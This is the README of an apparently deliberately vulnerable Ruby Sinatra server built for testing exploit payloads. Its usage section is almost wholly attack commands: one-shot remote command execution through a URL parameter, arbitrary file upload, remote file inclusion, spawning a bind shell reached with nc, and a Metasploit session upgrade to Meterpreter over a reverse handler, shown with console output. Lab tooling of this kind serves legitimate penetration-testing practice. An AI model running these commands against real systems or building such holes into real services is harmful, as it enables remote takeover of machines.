# Paystub Sinatra

This is some stub code for testing exploit payloads under a ruby runtime.

## Installation

Short version: you do not want to install this. But if you must:

    git clone https://github.com/ryanbreed/paystub-sinatra
    cd paystub-sinatra
    bundle install --path=vendor/bundle
    bundle exec rackup -o 0.0.0.0 -p 8000

## Usage

Seriously, you do not want to use this. It contains nothing but bad ideas.

### oneshot command execution

    curl http://doomed:8000/oneshot?cmd=id
    curl http://doomed:8000/oneshot?cmd=aWQK&encode=base64
    curl -XPOST -d 'cmd=aWQK&encode=base64' http://doomed:8000/oneshot

### file upload via PUT

    cat $(which id) | curl -XPUT --data-binary @- "http://doomed:8000/upload/id.bin"

### remote file inclusion

    curl http://doomed:8000/rfi?url=http://remote-server/path/to/code.rb

### fork a bindshell

    curl "http://doomed:8000/bindshell?port=4455&runit=true"
    echo id | nc doomed 4455
    echo 'exit!' | nc doomed 4455

### upgrade bindshell to meterpreter
    curl "http://doomed:8000/bindshell?port=4455&runit=true"
    ./msfconsole
    use payload/multi/handler
    set PAYLOAD ruby/shell_bind_tcp
    set RHOST doomed
    set LPORT 4455
    exploit

    [*] Started bind handler
    [*] Starting the payload handler...
    [*] Command shell session 1 opened ...
    ^Z

    Background session 1? [y/N]  y
    msf exploit(handler) > sessions -u 1
    [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

    [*] Upgrading session ID: 1
    [*] Starting exploit/multi/handler
    [*] Started reverse TCP handler on attacker:4433
    [*] Starting the payload handler...
    [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
    [*] Sending stage (1495599 bytes) to doomed
    [*] Command stager progress: 100.00% (668/668 bytes)
    msf exploit(handler) > [*] Meterpreter session 2 opened
## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/ryanbreed/paystub-sinatra. This project is intended to be a safe, welcoming space for collaboration, and contributors are expected to adhere to the [Contributor Covenant](http://contributor-covenant.org) code of conduct.

## License

The gem is available as open source under the terms of the [MIT License](http://opensource.org/licenses/MIT).
